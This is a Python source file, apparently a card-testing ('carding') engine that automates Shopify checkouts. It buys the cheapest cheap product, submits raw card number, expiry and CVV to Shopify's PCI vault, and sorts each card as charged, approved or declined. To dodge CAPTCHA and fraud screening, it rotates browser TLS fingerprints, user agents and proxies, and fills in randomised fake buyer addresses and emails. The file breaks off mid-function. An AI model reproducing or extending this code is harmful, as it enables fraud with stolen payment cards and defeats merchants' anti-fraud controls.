"""
Shopify Checkout Engine
========================
Anti-CAPTCHA focused checkout automation engine.
Drop-in replacement for newss API engine.

Key Fixes:
- Cheapest product selection (no random shuffle)
- Random address per attempt (28 countries)
- Browser profile rotation (chrome124 first, no chrome131)
- CAPTCHA detection with proper retryable flag
- Gate name = "Shopify Payments"
"""

import json
import random
import re
import time
import html
import urllib.parse
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
import threading

from curl_cffi.requests import Session
import logging

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("engine")


# ──────────────────────── Config ─────────────────────────────────────

# chrome131 is NOT in curl-cffi 0.7.0 — start with chrome124
BROWSER_PROFILES = [
    "chrome124",
    "chrome123",
    "chrome120",
    "chrome119",
    "chrome116",
    "chrome110",
    "edge101",
    "safari17_0",
    "safari15_5",
    "firefox133",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
]

MAX_PRICE_DEFAULT = 20.00
MIN_PRICE_DEFAULT = 0.50
GATE_NAME = "Shopify Payments"

# ──────────────────────── Enums / Result types ───────────────────────

class CheckStatus(Enum):
    CHARGED  = 0
    APPROVED = 1
    DECLINED = 2
    ERROR    = 3


@dataclass
class CheckResult:
    card: str
    status: CheckStatus
    status_code: str = ""
    amount: str = ""
    currency: str = ""
    site_name: str = ""
    shop_url: str = ""
    receipt_url: str = ""
    error: Exception = None
    retryable: bool = False


# ──────────────────────── Address database ───────────────────────────

@dataclass
class Address:
    first_name: str
    last_name: str
    address1: str
    address2: str
    city: str
    country_code: str
    zone_code: str
    postal_code: str
    phone: str
    email_domain: str = "gmail.com"


COUNTRY_ADDRESSES: Dict[str, Address] = {
    "US":     Address("james",   "anderson", "428 W 45th St",          "Apt 4B",   "New York",     "US", "NY",  "10036",   "+12125550100", "gmail.com"),
    "US-CA":  Address("michael", "johnson",  "123 Hollywood Blvd",     "Suite 100","Los Angeles",  "US", "CA",  "90028",   "+13235550100", "yahoo.com"),
    "US-TX":  Address("robert",  "williams", "456 Main St",            "",         "Houston",      "US", "TX",  "77002",   "+17135550100", "outlook.com"),
    "US-FL":  Address("david",   "brown",    "789 Ocean Dr",           "Apt 12",   "Miami",        "US", "FL",  "33139",   "+13055550100", "hotmail.com"),
    "CA":     Address("john",    "smith",    "200 Kent St",            "",         "Ottawa",       "CA", "ON",  "K1A 0G9", "+16135550100", "gmail.com"),
    "CA-BC":  Address("william", "davis",    "789 Granville St",       "Floor 5",  "Vancouver",    "CA", "BC",  "V6Z 1K9", "+16045550100", "gmail.com"),
    "GB":     Address("james",   "wilson",   "10 Downing St",          "",         "London",       "GB", "ENG", "SW1A 2AA","+442012345678","gmail.com"),
    "GB-MAN": Address("oliver",  "martinez", "123 Deansgate",          "Apt 3B",   "Manchester",   "GB", "ENG", "M3 4BQ",  "+441619876543","outlook.com"),
    "AU":     Address("thomas",  "taylor",   "1 George St",            "",         "Sydney",       "AU", "NSW", "2000",    "+61212345678", "gmail.com"),
    "AU-MEL": Address("daniel",  "anderson", "100 Collins St",         "Level 10", "Melbourne",    "AU", "VIC", "3000",    "+61398765432", "yahoo.com"),
    "DE":     Address("lucas",   "thomas",   "Friedrichstr 100",       "",         "Berlin",       "DE", "BE",  "10117",   "+493012345678","gmail.com"),
    "DE-MUC": Address("felix",   "schmidt",  "Marienplatz 1",          "",         "Munich",       "DE", "BY",  "80331",   "+49891234567", "gmail.com"),
    "FR":     Address("hugo",    "bernard",  "10 Rue de Rivoli",       "",         "Paris",        "FR", "IDF", "75001",   "+33112345678", "gmail.com"),
    "FR-LY":  Address("louis",   "petit",    "15 Rue de la République","",         "Lyon",         "FR", "ARA", "69001",   "+33487654321", "outlook.com"),
    "NZ":     Address("jack",    "wilson",   "1 Queen St",             "",         "Auckland",     "NZ", "AUK", "1010",    "+6491234567",  "gmail.com"),
    "NZ-WLG": Address("liam",    "brown",    "100 Willis St",          "Floor 2",  "Wellington",   "NZ", "WGN", "6011",    "+6449876543",  "gmail.com"),
    "IE":     Address("sean",    "murphy",   "1 Grafton St",           "",         "Dublin",       "IE", "D",   "D02 Y006","+35311234567", "gmail.com"),
    "IE-CORK":Address("patrick", "kelly",    "100 Patrick St",         "",         "Cork",         "IE", "CO",  "T12 XY88","+35321456789", "gmail.com"),
    "NL":     Address("bas",     "jansen",   "Dam 1",                  "",         "Amsterdam",    "NL", "NH",  "1012 JS", "+31201234567", "gmail.com"),
    "ES":     Address("carlos",  "garcia",   "Calle Mayor 1",          "",         "Madrid",       "ES", "M",   "28013",   "+34912345678", "gmail.com"),
    "IT":     Address("marco",   "rossi",    "Via Roma 1",             "",         "Rome",         "IT", "RM",  "00184",   "+39061234567", "gmail.com"),
    "SE":     Address("erik",    "andersson","Vasagatan 1",            "",         "Stockholm",    "SE", "AB",  "111 20",  "+468123456",   "gmail.com"),
    "NO":     Address("olav",    "hansen",   "Karl Johans gate 1",     "",         "Oslo",         "NO", "03",  "0154",    "+4721234567",  "gmail.com"),
    "DK":     Address("lars",    "nielsen",  "Strøget 1",              "",         "Copenhagen",   "DK", "84",  "1457",    "+4531234567",  "gmail.com"),
    "FI":     Address("jussi",   "korhonen", "Mannerheimintie 1",      "",         "Helsinki",     "FI", "18",  "00100",   "+35891234567", "gmail.com"),
    "BE":     Address("jan",     "peeters",  "Grote Markt 1",          "",         "Brussels",     "BE", "BRU", "1000",    "+3221234567",  "gmail.com"),
    "CH":     Address("hans",    "weber",    "Bahnhofstrasse 1",       "",         "Zurich",       "CH", "ZH",  "8001",    "+41441234567", "gmail.com"),
    "AT":     Address("markus",  "gruber",   "Stephansplatz 1",        "",         "Vienna",       "AT", "9",   "1010",    "+4312345678",  "gmail.com"),
    "JP":     Address("takashi", "yamamoto", "1-1-1 Marunouchi",       "",         "Tokyo",        "JP", "13",  "100-0005","+81312345678", "gmail.com"),
    "SG":     Address("wei",     "tan",      "1 Raffles Place",        "#01-01",   "Singapore",    "SG", "01",  "048616",  "+6561234567",  "gmail.com"),
    "AE":     Address("ahmed",   "al-mansouri","Sheikh Zayed Road 1",  "",         "Dubai",        "AE", "DU",  "12345",   "+97141234567", "gmail.com"),
}

SHIPPING_FALLBACK_ORDER = ["US", "CA", "GB", "AU", "DE", "FR", "NL", "IE", "SE", "NO", "DK"]

EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com", "icloud.com", "aol.com", "mail.com", "yandex.com", "proton.me"]
FIRST_NAMES = ["james", "john", "robert", "michael", "william", "david", "richard", "joseph", "thomas", "charles", "mary", "patricia", "jennifer", "linda", "elizabeth", "barbara", "susan", "jessica", "sarah", "karen"]
LAST_NAMES  = ["smith", "johnson", "williams", "brown", "jones", "garcia", "miller", "davis", "rodriguez", "martinez", "anderson", "taylor", "thomas", "moore", "jackson", "martin", "lee", "white", "harris", "clark"]


def generate_random_email() -> str:
    name = random.choice(FIRST_NAMES) + random.choice(LAST_NAMES) + str(random.randint(1, 999))
    return f"{name}@{random.choice(EMAIL_DOMAINS)}"


def address_for_country(country: str) -> Address:
    if country in COUNTRY_ADDRESSES:
        return COUNTRY_ADDRESSES[country]
    base = country[:2] if len(country) > 2 else country
    if base in COUNTRY_ADDRESSES:
        return COUNTRY_ADDRESSES[base]
    return COUNTRY_ADDRESSES["US"]


def get_fallback_addresses(exclude_country: str = "US") -> List[Address]:
    """Return ordered list of fallback addresses — US first (most reliable)."""
    result = []
    for code in SHIPPING_FALLBACK_ORDER:
        if code.upper() != exclude_country.upper() and code in COUNTRY_ADDRESSES:
            result.append(COUNTRY_ADDRESSES[code])
    return result


def random_address() -> Address:
    """Random address from database — anti-CAPTCHA."""
    return random.choice(list(COUNTRY_ADDRESSES.values()))


# ──────────────────────── TLS Client ─────────────────────────────────

class TLSClient:
    def __init__(self, timeout=20, proxy_url=None, impersonate=None, user_agent=None):
        self.timeout = timeout
        self.proxy_url = proxy_url or ""
        if impersonate is None:
            impersonate = random.choice(BROWSER_PROFILES)
        if user_agent is None:
            user_agent = random.choice(USER_AGENTS)
        self.impersonate = impersonate
        self.user_agent = user_agent

        _session_kwargs = {"impersonate": impersonate, "timeout": timeout}
        if self.proxy_url:
            _session_kwargs["proxy"] = self.proxy_url
        self.session = Session(**_session_kwargs)
        self.session.headers.update({
            'User-Agent': user_agent,
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        })

    def get(self, url, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        return self.session.get(url, **kwargs)

    def post(self, url, data=None, json=None, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        return self.session.post(url, data=data, json=json, **kwargs)

    def close(self):
        try:
            self.session.close()
        except Exception:
            pass

    def __enter__(self):
        return self

    def __exit__(self, *args):
        self.close()


# ──────────────────────── Step 0: cheapest product ───────────────────

def find_cheapest_product(client: TLSClient, shop_url: str,
                           min_price: float = MIN_PRICE_DEFAULT,
                           max_price: float = MAX_PRICE_DEFAULT) -> Tuple[str, str, str, str]:
    """
    Fetch /products.json, filter by price range, pick CHEAPEST variant.
    NOTE: We intentionally do NOT shuffle — newss API picks cheapest.
    """
    url = f"{shop_url}/products.json?limit=250"
    _RETRYABLE = {400, 429, 500, 502, 503, 504}
    resp = None
    last_err: Optional[Exception] = None

    for attempt in range(1, 4):
        try:
            resp = client.get(url)
        except Exception as exc:
            last_err = exc
            logger.warning("find_cheapest_product attempt %d/3 network error: %s", attempt, exc)
            if attempt < 3:
                time.sleep(2 + random.random() * 2)
            continue

        if resp.status_code == 200:
            break

        if resp.status_code in _RETRYABLE:
            last_err = Exception(f"HTTP {resp.status_code}")
            logger.warning("find_cheapest_product attempt %d/3: HTTP %s", attempt, resp.status_code)
            if attempt < 3:
                time.sleep(2 + random.random() * 2)
            continue

        raise Exception(f"products.json returned {resp.status_code}")
    else:
        raise Exception(f"products.json failed after 3 attempts: {last_err}")

    if resp is None or resp.status_code != 200:
        raise Exception(f"products.json unavailable: {last_err}")

    products = resp.json().get("products", [])
    if not products:
        raise Exception("NO_PRODUCT: No products found")

    in_range: List[Dict] = []
    fallback: List[Dict] = []

    for p in products:
        for v in p.get("variants", []):
            if v.get("available") is False:
                continue
            if v.get("inventory_quantity") is not None and v["inventory_quantity"] <= 0:
                continue
            try:
                price_f = float(v.get("price") or 0)
            except (ValueError, TypeError):
                continue
            if price_f < min_price:
                continue

            entry = {
                "variant_id": str(v["id"]),
                "product_id": str(p["id"]),
                "title": p.get("title", ""),
                "price": v.get("price", ""),
                "price_f": price_f,
            }
            if price_f <= max_price:
                in_range.append(entry)
            fallback.append(entry)

    # ── Pick CHEAPEST (no shuffle) ──
    if in_range:
        in_range.sort(key=lambda x: x["price_f"])
        pick = in_range[0]
    else:
        if not fallback:
            raise Exception(f"NO_PRODUCT: No products under ${max_price:.2f}")
        fallback.sort(key=lambda x: x["price_f"])
        cheapest = fallback[0]
        if cheapest["price_f"] > max_price:
            raise Exception(f"PRICE_OVER_MAX: total ${cheapest['price_f']:.2f} > ${max_price:.2f}")
        pick = cheapest

    return pick["title"], pick["product_id"], pick["variant_id"], pick["price"]


# ──────────────────────── Step 1: cart → checkout ────────────────────

def add_to_cart_and_checkout(client: TLSClient, shop_url: str, variant_id: str) -> Tuple[str, str, str, str]:
    cart_permalink = f"{shop_url}/cart/{variant_id}:1"
    checkout_resp = client.get(cart_permalink, allow_redirects=True, headers={
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9,en-IN;q=0.8",
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "referer": shop_url + "/",
        "sec-ch-ua": '"Chromium";v="124", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
    })

    if checkout_resp.status_code not in (200, 302):
        raise Exception(f"CART_FAILED: HTTP {checkout_resp.status_code}")

    checkout_url = checkout_resp.url
    checkout_html = checkout_resp.text

    token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
    checkout_token = token_match.group(1) if token_match else ""

    session_match = re.search(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"', checkout_html)
    session_token = html.unescape(session_match.group(1)).strip('"') if session_match else ""

    return checkout_url, checkout_token, session_token, checkout_html


# ──────────────────────── Step 2: private access token ───────────────

def extract_private_access_token_id(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"', unescaped)
    return match.group(1) if match else ""


def fetch_private_access_token(client: TLSClient, shop_url: str, checkout_url: str, pat_id: str) -> str:
    req_url = f"{shop_url}/private_access_tokens?id={urllib.parse.quote(pat_id)}&checkout_type=c1"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "referer": checkout_url,
        "sec-ch-ua": '"Chromium";v="124", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
    }
    resp = client.get(req_url, headers=headers)
    return f"[{resp.status_code}] {resp.text}"


# ──────────────────────── Step 3: actions JS ─────────────────────────

def extract_actions_js_url(checkout_html: str, shop_url: str) -> str:
    match = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)', checkout_html)
    return shop_url + match.group(1) if match else ""


def fetch_actions_js(client: TLSClient, actions_url: str, shop_url: str) -> str:
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "origin": shop_url,
        "priority": "u=1",
        "sec-ch-ua": '"Chromium";v="124", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "script",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
    }
    resp = client.get(actions_url, headers=headers)
    if resp.status_code != 200:
        raise Exception(f"GET actions JS returned {resp.status_code}")
    return resp.text


def extract_proposal_id(js_body: str) -> str:
    match = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js_body)
    return match.group(1) if match else ""


def extract_submit_for_completion_id(js_body: str) -> str:
    match = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js_body)
    return match.group(1) if match else ""


def extract_poll_for_receipt_id(js_body: str) -> str:
    patterns = [
        r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"',
        r'name:\s*"PollForReceipt"\s*,\s*type:\s*"query"\s*,\s*id:\s*"([a-f0-9]{64})"',
        r'"PollForReceipt"[^}]{0,200}id:\s*"([a-f0-9]{64})"',
        r'PollForReceipt.{0,300}?([a-f0-9]{64})',
    ]
    for p in patterns:
        match = re.search(p, js_body)
        if match:
            return match.group(1)
    return ""


# ──────────────────────── Extraction helpers ─────────────────────────

def extract_queue_token(proposal_json: str) -> str:
    match = re.search(r'"queueToken"\s*:\s*"([^"]+)"', proposal_json)
    return match.group(1) if match else ""


def extract_is_shipping_required(proposal_json: str) -> bool:
    try:
        data = json.loads(proposal_json)
        seller = (data.get("data", {})
                      .get("session", {})
                      .get("negotiate", {})
                      .get("result", {})
                      .get("sellerProposal", {}))
        return seller.get("isShippingRequired", True)
    except Exception:
        return True


def extract_stable_id(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"', unescaped)
    return match.group(1) if match else ""


def extract_commit_sha(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
    return match.group(1) if match else ""


def extract_source_token(checkout_html: str) -> str:
    match = re.search(r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"', checkout_html)
    return html.unescape(match.group(1)).strip('"') if match else ""


def extract_identification_signature(checkout_html: str) -> str:
    unescaped = checkout_html.replace('&quot;', '"')
    for pattern in [
        r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"',
        r'CardsinkCallerIdentificationSignature":"([^"]+)"',
        r'cardsinkCallerIdentificationSignature":"([^"]+)"',
        r'"identification_signature"\s*:\s*"([^"]+)"',
    ]:
        m = re.search(pattern, unescaped)
        if m:
            return m.group(1)
    return ""


def extract_vault_url(checkout_html: str) -> str:
    decoded = checkout_html.replace('&quot;', '"')
    m = re.search(r'(https://[a-z0-9._-]*(?:shopifycs|shopifyinc)\.[a-z.]+/sessions)', decoded)
    if m:
        return m.group(1)
    hf = re.search(r'"hostedFields"[^}]*"url"\s*:\s*"(https://[^"]+)"', decoded)
    if hf:
        return hf.group(1).rsplit("/", 2)[0] + "/sessions"
    return ""


def extract_vault_domain(checkout_html: str) -> str:
    decoded = checkout_html.replace('&quot;', '"')
    m = re.search(r'hostedFieldsUrl[^}]+"domain"\s*:\s*"([^"]+)"', decoded)
    if m:
        return m.group(1)
    return ""


def extract_pci_session_id(pci_body: str) -> str:
    match = re.search(r'"id"\s*:\s*"([^"]+)"', pci_body)
    return match.group(1) if match else ""


def extract_delivery_handle(proposal_body: str) -> str:
    try:
        data = json.loads(proposal_body)
        seller = (data.get("data", {})
                      .get("session", {})
                      .get("negotiate", {})
                      .get("result", {})
                      .get("sellerProposal", {}))
        dlv = seller.get("delivery", {})
        h = dlv.get("selectedDeliveryStrategy", {}).get("handle", "")
        if h:
            return h
        h = dlv.get("deliveryStrategyHandle", "")
        if h:
            return h
        for line in dlv.get("deliveryLines", []):
            for macro in line.get("deliveryMacros", []):
                handles = macro.get("deliveryStrategyHandles", [])
                if handles:
                    return handles[0]
    except Exception:
        pass
    patterns = [
        r'"selectedDeliveryStrategy"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"',
        r'"deliveryStrategyHandle"\s*:\s*"([^"]+)"',
        r'"handle"\s*:\s*"([a-f0-9\-]{20,})"',
    ]
    for p in patterns:
        match = re.search(p, proposal_body)
        if match:
            return match.group(1)
    return ""


def extract_signed_handles(proposal_json: str) -> List[str]:
    try:
        data = json.loads(proposal_json)
        seller = (data.get("data", {})
                      .get("session", {})
                      .get("negotiate", {})
                      .get("result", {})
                      .get("sellerProposal", {}))
        de = seller.get("deliveryExpectations", {})
        de_typename = de.get("__typename", "")

        if de_typename == "FilledDeliveryExpectationTerms":
            handles = [x["signedHandle"] for x in de.get("deliveryExpectations", []) if x.get("signedHandle")]
            if handles:
                return handles
            handles = [x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")
                       for x in de.get("deliveryExpectations", [])
                       if x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")]
            if handles:
                return handles

        dlv = seller.get("delivery", {})
        if dlv.get("__typename") == "FilledDeliveryTerms" or de_typename == "FilledDeliveryTerms":
            return []

        if "deliveryExpectations" in de:
            expectations = de.get("deliveryExpectations", [])
            if isinstance(expectations, list):
                handles = [x.get("signedHandle") or x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")
                           for x in expectations
                           if x.get("signedHandle") or x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")]
                if handles:
                    return handles

        if de_typename in ["UnfilledDeliveryExpectationTerms", "UnavailableTerms", "PendingTerms"]:
            return []
    except Exception:
        pass
    return []


def extract_shipping_amount(proposal_body: str) -> str:
    match = re.search(r'"deliveryStrategyBreakdown"\s*:\s*\[\s*\{\s*"amount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return match.group(1) if match else ""


def extract_checkout_total(proposal_body: str) -> str:
    match = re.search(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return match.group(1) if match else ""


def extract_seller_total(proposal_body: str) -> str:
    match = re.search(r'"total"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return match.group(1) if match else ""


def extract_running_total(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        val = (data.get("data", {})
                    .get("session", {})
                    .get("negotiate", {})
                    .get("result", {})
                    .get("sellerProposal", {})
                    .get("runningTotal", {})
                    .get("value", {}))
        return val.get("amount", "")
    except Exception:
        return ""


def extract_seller_merchandise_price(proposal_body: str) -> str:
    match = re.search(
        r'"ContextualizedProductVariantMerchandise".*?"totalAmount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
        proposal_body)
    return match.group(1) if match else ""


def extract_seller_currency(proposal_body: str) -> str:
    match = re.search(r'"supportedCurrencies"\s*:\s*\["([^"]+)"', proposal_body)
    return match.group(1) if match else ""


def extract_seller_country(proposal_body: str) -> str:
    match = re.search(r'"supportedCountries"\s*:\s*\["([^"]+)"', proposal_body)
    return match.group(1) if match else ""


def extract_tax_amount(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        val = (data.get("data", {})
                    .get("session", {})
                    .get("negotiate", {})
                    .get("result", {})
                    .get("sellerProposal", {})
                    .get("tax", {})
                    .get("totalTaxAmount", {})
                    .get("value", {}))
        return val.get("amount", "0.0")
    except Exception:
        return "0.0"


def extract_tax_from_rejected(submit_json: str) -> str:
    try:
        data = json.loads(submit_json)
        seller = (data.get("data", {})
                      .get("submitForCompletion", {})
                      .get("sellerProposal", {}))
        return (seller.get("tax", {})
                      .get("totalTaxAmount", {})
                      .get("value", {})
                      .get("amount", "0.0"))
    except Exception:
        return "0.0"


def extract_total_from_rejected(submit_json: str) -> str:
    try:
        data = json.loads(submit_json)
        seller = (data.get("data", {})
                      .get("submitForCompletion", {})
                      .get("sellerProposal", {}))
        for key in ("checkoutTotal", "total", "runningTotal"):
            val = seller.get(key, {}).get("value", {}).get("amount")
            if val:
                return val
        return ""
    except Exception:
        return ""


def extract_receipt_id(submit_body: str) -> str:
    match = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', submit_body)
    return match.group(1) if match else ""


def extract_receipt_session_token(submit_body: str) -> str:
    match = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', submit_body)
    return match.group(1) if match else ""


_SHOPIFY_ERROR_MAP: Dict[str, str] = {
    "risky": "RISK_REJECTED",
    "risk": "RISK_REJECTED",
    "fraud": "RISK_REJECTED",
    "suspected fraud": "RISK_REJECTED",
    "do not honor": "DO_NOT_HONOR",
    "do_not_honor": "DO_NOT_HONOR",
    "insufficient funds": "INSUFFICIENT_FUNDS",
    "insufficient_funds": "INSUFFICIENT_FUNDS",
    "card declined": "CARD_DECLINED",
    "card_declined": "CARD_DECLINED",
    "invalid card": "CARD_INVALID",
    "invalid_card": "CARD_INVALID",
    "expired card": "EXPIRED_CARD",
    "card expired": "EXPIRED_CARD",
    "incorrect cvc": "INVALID_CVC",
    "incorrect_cvc": "INVALID_CVC",
    "security code": "INVALID_CVC",
    "stolen card": "CARD_STOLEN",
    "lost card": "CARD_STOLEN",
    "pickup card": "CARD_STOLEN",
    "address": "ADDRESS_INVALID",
    "zip": "ZIP_INVALID",
    "postal": "ZIP_INVALID",
    "throttled": "THROTTLED",
    "too many": "THROTTLED",
    "rate limit": "THROTTLED",
    "gateway": "GATEWAY_ERROR",
    "processing error": "PROCESSING_ERROR",
    "inventory": "OUT_OF_STOCK",
    "out of stock": "OUT_OF_STOCK",
    "unavailable": "OUT_OF_STOCK",
    "captcha": "CAPTCHA_REQUIRED",
    "terms": "TERMS_REQUIRED",
    "payment method": "PAYMENT_METHOD_INVALID",
    "no session token": "NO_SESSION_TOKEN",
    "no_session_token": "NO_SESSION_TOKEN",
    "tokenization": "TOKENIZATION_FAILED",
    "tokenize": "TOKENIZATION_FAILED",
}


def _map_error(raw: str) -> str:
    low = raw.lower()
    for keyword, code in _SHOPIFY_ERROR_MAP.items():
        if keyword in low:
            return code
    return raw.upper().replace(" ", "_")[:40]


def extract_any_error(submit_body: str) -> str:
    for pattern in [
        r'"nonLocalizedMessage"\s*:\s*"([^"]+)"',
        r'"localizedMessage"\s*:\s*"([^"]+)"',
        r'"code"\s*:\s*"([^"]+)"',
        r'"message"\s*:\s*"([^"]+)"',
    ]:
        match = re.search(pattern, submit_body)
        if match:
            return _map_error(match.group(1))
    return ""


def extract_submit_error(submit_body: str) -> str:
    match = re.search(r'"nonLocalizedMessage"\s*:\s*"([^"]+)"', submit_body)
    if match:
        return match.group(1)
    match = re.search(r'"code"\s*:\s*"([^"]+)"', submit_body)
    return match.group(1) if match else ""


def extract_receipt_status_code(poll_body: str, receipt_type: str) -> str:
    if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
        return "ORDER_PLACED"
    if receipt_type == "ProcessingReceipt":
        return "PROCESSING"
    match = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
    if match:
        code = match.group(1)
        if "CAPTCHA" in code:
            return "CAPTCHA_REQUIRED"
        return code
    if "CAPTCHA" in poll_body:
        return "CAPTCHA_REQUIRED"
    if receipt_type == "FailedReceipt":
        return "FAILED"
    return "UNKNOWN"


def detect_shipping_restriction(proposal_body: str) -> bool:
    restriction_signals = [
        "SHIPPING_ADDRESS_UNDELIVERABLE",
        "no_delivery_options_available",
        "noDeliveryOptionsAvailable",
        "delivery is not available",
        "does not ship to",
    ]
    lower = proposal_body.lower()
    return any(s.lower() in lower for s in restriction_signals)


# ──────────────────────── Payload helpers ────────────────────────────

def patch_payload(payload: str, currency: str, country: str) -> str:
    if currency == "USD" and country == "US":
        return payload
    try:
        data = json.loads(payload)
    except json.JSONDecodeError:
        if currency != "USD":
            payload = payload.replace('"currencyCode":"USD"', f'"currencyCode":"{currency}"')
            payload = payload.replace('"presentmentCurrency":"USD"', f'"presentmentCurrency":"{currency}"')
        if country != "US":
            payload = payload.replace('"phoneCountryCode":"US"', f'"phoneCountryCode":"{country}"')
        return payload

    def _walk(obj, in_buyer_identity):
        if isinstance(obj, dict):
            patched = {}
            for k, v in obj.items():
                if k == "presentmentCurrency" and v == "USD" and currency != "USD":
                    patched[k] = currency
                elif k == "phoneCountryCode" and v == "US" and country != "US":
                    patched[k] = country
                elif k == "countryCode" and v == "US" and country != "US" and in_buyer_identity:
                    patched[k] = country
                elif k == "customer":
                    patched[k] = _walk(v, True)
                else:
                    patched[k] = _walk(v, in_buyer_identity)
            return patched
        if isinstance(obj, list):
            return [_walk(i, in_buyer_identity) for i in obj]
        return obj

    patched_data = _walk(data, False)
    return json.dumps(patched_data, separators=(",", ":"))


def generate_attempt_token(checkout_token: str) -> str:
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    return f"{checkout_token}-{''.join(random.choice(chars) for _ in range(10))}"


def generate_page_id() -> str:
    return f"{random.getrandbits(64):016x}"


# ──────────────────────── Step 9: PCI tokenisation ───────────────────

def send_pci_session(ident_sig: str, card_number: str, card_name: str,
                     card_month: int, card_year: int, cvv: str,
                     shop_domain: str, proxy_url: str = "",
                     vault_url: str = "", vault_domain: str = "",
                     impersonate: str = "chrome124") -> Tuple[int, str]:
    _DEFAULT_VAULT = "https://checkout.pci.shopifyinc.com/sessions"
    endpoint = vault_url or _DEFAULT_VAULT
    scope = vault_domain or shop_domain
    origin_base = endpoint.rsplit("/sessions", 1)[0] if "/sessions" in endpoint else "https://checkout.pci.shopifyinc.com"

    payload = json.dumps({
        "credit_card": {
            "number": card_number,
            "month": card_month,
            "year": card_year,
            "verification_value": cvv,
            "start_month": None,
            "start_year": None,
            "issue_number": "",
            "name": card_name,
        },
        "payment_session_scope": scope,
    })

    headers = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": origin_base,
        "priority": "u=1, i",
        "referer": f"{origin_base}/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
        "sec-ch-ua": '"Chromium";v="124", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
